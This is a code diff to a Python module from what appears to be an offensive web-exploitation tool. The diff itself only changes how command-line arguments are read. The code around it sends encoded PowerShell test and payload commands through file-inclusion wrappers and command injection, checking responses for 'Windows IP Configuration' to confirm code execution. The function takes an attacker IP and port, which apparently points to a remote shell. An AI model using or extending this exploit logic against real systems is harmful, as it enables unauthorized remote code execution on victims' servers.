@@ -1,7 +1,7 @@
 """Powershell"""
 from src.httpreqs import request
 from src.utils.info import printInfo
-from src.utils.arguments import args
+from src.utils.arguments import ArgumentHandler
 from src.attacks.logPoison import exploit_log_poison
 from src.configs import config
 from src.utils.encodings import encode
@@ -9,6 +9,7 @@ from src.utils.encodings import encode
 
 def exploit_powershell(exploit, method, ip, port):
     """Exploit Powershell"""
+    args = ArgumentHandler()
     url = exploit["GETVAL"]
     post = exploit["POSTVAL"]
 
@@ -24,7 +25,7 @@ def exploit_powershell(exploit, method, ip, port):
     if method == "INPUT":
         res, _ = request.REQUEST(
             url.replace(config.tempArg, encode(powershellTest)),
-            args.httpheaders,
+            args.args['httpheaders'],
             post,
             config.proxies,
             "",
@@ -36,7 +37,7 @@ def exploit_powershell(exploit, method, ip, port):
             u = url.replace(config.tempArg, encode(powershellPayload))
             request.REQUEST(
                 u,
-                args.httpheaders,
+                args.args['httpheaders'],
                 exploit["POSTVAL"],
                 config.proxies,
                 "",
@@ -47,10 +48,10 @@ def exploit_powershell(exploit, method, ip, port):
             return True
 
     if method == "DATA":
-        if args.postreq:
+        if args.args['postreq']:
             res, _ = request.REQUEST(
                 url.replace(config.tempArg, encode(powershellTest)),
-                args.httpheaders,
+                args.args['httpheaders'],
                 post,
                 config.proxies,
                 "",
@@ -60,7 +61,7 @@ def exploit_powershell(exploit, method, ip, port):
         else:
             res, _ = request.REQUEST(
                 url.replace(config.tempArg, encode(powershellTest)),
-                args.httpheaders,
+                args.args['httpheaders'],
                 "",
                 config.proxies,
                 "",
@@ -71,10 +72,10 @@ def exploit_powershell(exploit, method, ip, port):
         if "Windows IP Configuration" in res.text:
             printInfo(ip, port, "powershell", "data wrapper")
             u = url.replace(config.tempArg, encode(powershellPayload))
-            if args.postreq:
+            if args.args['postreq']:
                 request.REQUEST(
                     url.replace(config.tempArg, encode(powershellTest)),
-                    args.httpheaders,
+                    args.args['httpheaders'],
                     post,
                     config.proxies,
                     "",
@@ -83,15 +84,15 @@ def exploit_powershell(exploit, method, ip, port):
                 )
             else:
                 request.REQUEST(
-                    u, args.httpheaders, "", config.proxies, "", "", exploit=True
+                    u, args.args['httpheaders'], "", config.proxies, "", "", exploit=True
                 )
             return True
 
     if method == "EXPECT":
-        if args.postreq:
+        if args.args['postreq']:
             res, _ = request.REQUEST(
                 url,
-                args.httpheaders,
+                args.args['httpheaders'],
                 post.replace(config.tempArg, encode(powershellTest)),
                 config.proxies,
                 "",
@@ -101,7 +102,7 @@ def exploit_powershell(exploit, method, ip, port):
         else:
             res, _ = request.REQUEST(
                 url.replace(config.tempArg, encode(powershellTest)),
-                args.httpheaders,
+                args.args['httpheaders'],
                 "",
                 config.proxies,
                 "",
@@ -112,10 +113,10 @@ def exploit_powershell(exploit, method, ip, port):
         if "Windows IP Configuration" in res.text:
             u = url.replace(config.tempArg, encode(powershellPayload))
             printInfo(ip, port, "powershell", "expect wrapper")
-            if args.postreq:
+            if args.args['postreq']:
                 request.REQUEST(
                     url,
-                    args.httpheaders,
+                    args.args['httpheaders'],
                     post.replace(config.tempArg, encode(powershellTest)),
                     config.proxies,
                     "",
@@ -124,7 +125,7 @@ def exploit_powershell(exploit, method, ip, port):
                 )
             else:
                 request.REQUEST(
-                    u, args.httpheaders, "", config.proxies, "", "", exploit=True
+                    u, args.args['httpheaders'], "", config.proxies, "", "", exploit=True
                 )
             return True
 
@@ -142,10 +143,10 @@ def exploit_powershell(exploit, method, ip, port):
         return True
 
     if method == "CMD":
-        if args.postreq:
+        if args.args['postreq']:
             res, _ = request.REQUEST(
                 url,
-                args.httpheaders,
+                args.args['httpheaders'],
                 post.replace(config.tempArg, encode(powershellTest)),
                 config.proxies,
                 "",
@@ -155,7 +156,7 @@ def exploit_powershell(exploit, method, ip, port):
         else:
             res, _ = request.REQUEST(
                 url.replace(config.tempArg, encode(powershellTest)),
-                args.httpheaders,
+                args.args['httpheaders'],
                 "",
                 config.proxies,
                 "",
@@ -165,10 +166,10 @@ def exploit_powershell(exploit, method, ip, port):
 
         if "Windows IP Configuration" in res.text:
             printInfo(ip, port, "powershell", "command injection")
-            if args.postreq:
+            if args.args['postreq']:
                 request.REQUEST(
                     url,
-                    args.httpheaders,
+                    args.args['httpheaders'],
                     post.replace(config.tempArg, encode(powershellPayload)),
                     config.proxies,
                     "",
@@ -178,7 +179,7 @@ def exploit_powershell(exploit, method, ip, port):
             else:
                 request.REQUEST(
                     url.replace(config.tempArg, encode(powershellPayload)),
-                    args.httpheaders,
+                    args.args['httpheaders'],
                     "",
                     config.proxies,
                     "",
